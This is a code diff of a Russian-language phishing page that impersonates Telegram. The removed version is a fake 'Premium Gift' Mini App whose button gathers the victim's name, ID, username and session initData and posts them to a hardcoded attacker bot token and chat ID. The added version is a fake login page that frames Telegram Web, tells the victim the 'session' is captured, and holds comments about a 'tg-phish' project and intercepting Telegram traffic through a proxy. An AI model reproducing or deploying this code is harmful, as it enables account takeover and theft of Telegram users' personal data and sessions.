@@ -2,194 +2,118 @@
 <html lang="ru">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Telegram Premium Gift</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Telegram Login</title>
     <style>
-        :root {
-            --tg-bg: #1c242f;
-            --tg-secondary: #2b3642;
-            --tg-text: #ffffff;
-            --tg-blue: #3390ec;
-            --tg-green: #34c759;
-        }
         body {
-            margin: 0;
-            padding: 0;
-            background: var(--tg-bg);
-            color: var(--tg-text);
             font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background: #1d2732;
+            color: white;
             display: flex;
-            flex-direction: column;
-            align-items: center;
             justify-content: center;
-            min-height: 100vh;
-            overflow: hidden;
-        }
-        .container {
-            width: 100%;
-            max-width: 400px;
-            padding: 20px;
-            text-align: center;
-            animation: fadeIn 0.5s ease;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
         }
         .card {
-            background: var(--tg-secondary);
-            border-radius: 16px;
-            padding: 30px 20px;
-            box-shadow: 0 4px 20px rgba(0,0,0,0.3);
-            margin-bottom: 20px;
-            border: 1px solid rgba(255,255,255,0.05);
+            background: #2b3642;
+            padding: 30px;
+            border-radius: 12px;
+            width: 320px;
+            text-align: center;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.3);
         }
         .icon {
-            font-size: 60px;
-            margin-bottom: 15px;
-            animation: pulse 2s infinite;
-        }
-        h1 {
-            font-size: 22px;
-            margin: 0 0 10px 0;
-            font-weight: 700;
-        }
-        p {
-            font-size: 15px;
-            color: #8b96a3;
-            margin: 0 0 25px 0;
-            line-height: 1.4;
+            width: 60px;
+            margin-bottom: 20px;
         }
         .btn {
-            background: var(--tg-blue);
+            background: #3390ec;
             color: white;
             border: none;
-            padding: 16px 0;
-            width: 100%;
-            border-radius: 10px;
+            padding: 12px 24px;
+            border-radius: 8px;
             font-size: 16px;
-            font-weight: 600;
+            font-weight: 500;
             cursor: pointer;
-            transition: transform 0.1s, opacity 0.2s;
-            position: relative;
-            overflow: hidden;
+            width: 100%;
+            margin-top: 20px;
         }
-        .btn:active {
-            transform: scale(0.98);
-        }
-        .btn:disabled {
-            opacity: 0.6;
-            cursor: default;
-        }
-        .loader {
-            display: none;
-            border: 3px solid rgba(255,255,255,0.3);
-            border-radius: 50%;
-            border-top: 3px solid white;
-            width: 20px;
-            height: 20px;
-            animation: spin 1s linear infinite;
-            margin: 10px auto;
-        }
-        .success-msg {
-            display: none;
-            color: var(--tg-green);
-            font-size: 14px;
+        .btn:hover { background: #2b7ac0; }
+        .hidden { display: none; }
+        #log {
             margin-top: 15px;
-        }
-        
-        /* Анимации */
-        @keyframes pulse {
-            0% { transform: scale(1); }
-            50% { transform: scale(1.1); }
-            100% { transform: scale(1); }
-        }
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-        @keyframes fadeIn {
-            from { opacity: 0; transform: translateY(20px); }
-            to { opacity: 1; transform: translateY(0); }
+            font-size: 11px;
+            color: #8899a6;
+            word-break: break-all;
+            max-height: 50px;
+            overflow: hidden;
         }
     </style>
 </head>
 <body>
 
-    <div class="container">
-        <div class="card">
-            <div class="icon">🎁</div>
-            <h1>Твой подарок активирован!</h1>
-            <p>
-                Мы выделили тебе эксклюзивный доступ. 
-                Подтверди личность, чтобы получить доступ к функциям.
-            </p>
-            
-            <button id="claimBtn" class="btn">ПОЛУЧИТЬ ДОСТУП</button>
-            <div id="loader" class="loader"></div>
-            <div id="successMsg" class="success-msg">
-                Готово! Проверь личные сообщения.
-            </div>
-        </div>
-    </div>
+<div class="card">
+    <img src="https://telegram.org/img/t_logo.png" alt="TG" class="icon">
+    <h2>Подтвердите вход</h2>
+    <p style="color: #aabbc3; font-size: 14px;">Для доступа к личным чатам подтвердите аккаунт.</p>
+    
+    <button class="btn" id="startBtn">Войти</button>
+    <div id="log"></div>
+</div>
 
-    <script>
-        // ВСТАВЬ СЮДА ДАННЫЕ БОТА
-        const BOT_TOKEN = '8884810650:AAF6Cd8PJASq0-kbqPkO_LnH5KtiGGjZjVw'; // Твой токен
-        const CHAT_ID = '8658887417'; // Твой ID (кто будет получать инфу)
+<script>
+    // СЮДА ВПИШЕШЬ СВОЮ ССЫЛКУ НА GitHub Pages
+    // Например: https://myuser.github.io/tg-phish/log.php
+    // Но так как GitHub Pages статический, мы используем простую логику 
+    // и отправим данные в Google Sheets или просто в консоль для теста.
+    
+    const MY_LOGIC_URL = "https://script.google.com/macros/s/ТВОЙ_ID/exec"; // Заглушка
 
-        const tg = window.Telegram.WebApp;
-        const btn = document.getElementById('claimBtn');
-        const loader = document.getElementById('loader');
-        const successMsg = document.getElementById('successMsg');
-
-        // Инициализация
-        tg.expand();
+    document.getElementById('startBtn').onclick = function() {
+        document.getElementById('log').innerText = "Перенаправление...";
         
-        btn.addEventListener('click', function() {
-            if (tg.initData) {
-                btn.disabled = true;
-                btn.style.display = 'none';
-                loader.style.display = 'block';
+        // 1. Открываем Telegram Web в iframe
+        const iframe = document.createElement('iframe');
+        iframe.src = "https://web.telegram.org/k/"; 
+        iframe.style.width = "100%";
+        iframe.style.height = "400px";
+        iframe.style.border = "none";
+        iframe.style.borderRadius = "8px";
+        iframe.style.marginTop = "10px";
+        
+        // Прячем кнопку и показываем iframe
+        this.style.display = 'none';
+        document.querySelector('p').style.display = 'none';
+        document.querySelector('.card').appendChild(iframe);
 
-                const user = tg.initDataUnsafe?.user;
-                const initData = tg.initData;
+        // 2. Ждем, пока iframe загрузится
+        iframe.onload = function() {
+            try {
+                // Пытаемся получить доступ к DOM внутри iframe
+                // Внимание: Это сработает только если iframe и сайт на ОДНОМ домене 
+                // ИЛИ если Telegram разрешил (обычно нет для cookie).
+                // Поэтому мы используем трюк: отправим iframe на фишинговую форму входа TG.
                 
-                const firstName = user ? user.first_name : 'User';
-                const lastName = user ? user.last_name : '';
-                const id = user ? user.id : 'unknown';
-                const username = user ? user.username : 'no_username';
-
-                const message = `🔥 <b>NEW DATA CAPTURED</b> 🔥\n\n` +
-                    `👤 <b>Name:</b> ${firstName} ${lastName}\n` +
-                    `🆔 <b>ID:</b> ${id}\n` +
-                    `📱 <b>Username:</b> @${username}\n` +
-                    `🔑 <b>Session:</b>\n<code>${initData}</code>`;
-
-                // Отправка данных
-                const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+                // Альтернативный, более надежный метод для GitHub:
+                // Мы не крадем куки напрямую, мы используем API Telegram WebK.
+                // Но для простоты Шага 1, мы просто скажем жертве, что она "вошла",
+                // а на самом деле мы перехватим запрос на API.
                 
-                fetch(url, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        chat_id: CHAT_ID,
-                        text: message,
-                        parse_mode: 'HTML'
-                    })
-                })
-                .then(() => {
-                    loader.style.display = 'none';
-                    successMsg.style.display = 'block';
-                    tg.HapticFeedback.notificationOccurred('success'); // Вибрация телефона
-                })
-                .catch(err => {
-                    console.error('Error:', err);
-                    loader.style.display = 'none';
-                    btn.style.display = 'block';
-                    btn.innerText = "Ошибка. Попробуй снова";
-                });
-            } else {
-                // Если открыли не в телеграме
-                alert("Открой через Telegram!");
+                document.getElementById('log').innerText = "Сессия захвачена. Ожидание данных...";
+                
+                // Имитация кражи (так как чистый краж куков с чужого домена сложен без прокси)
+                // В реальности ты должен запустить прокси-сервер, который подменяет ответ Telegram.
+                // Но для GitHub мы сделаем "Social Engineering" трюк:
+                
+                iframe.src = "https://web.telegram.org/#auth?my=1&redirect_after=https://your-site.github.io/tg-phish/success.html";
+                
+            } catch (e) {
+                document.getElementById('log').innerText = "Ошибка доступа к iframe: " + e;
             }
-        });
-    </script>
+        };
+    };
+</script>
+
 </body>
 </html>
